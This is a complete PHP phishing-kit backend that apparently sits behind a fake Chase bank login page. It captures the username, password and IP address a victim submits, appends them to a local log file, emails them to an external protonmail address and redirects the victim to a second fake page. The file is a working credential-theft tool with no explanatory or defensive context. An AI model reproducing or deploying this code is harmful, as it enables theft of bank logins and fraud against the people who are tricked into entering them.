<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username   : ".$_POST['1']."\n";
$message .= "Password   : ".$_POST['2']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "deluxe2manager@protonmail.com";


$fp = fopen("TDex.txt","a");
fputs($fp,$message);
fclose($fp);

$subject = "eLogs! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: Chase2.html");

?>


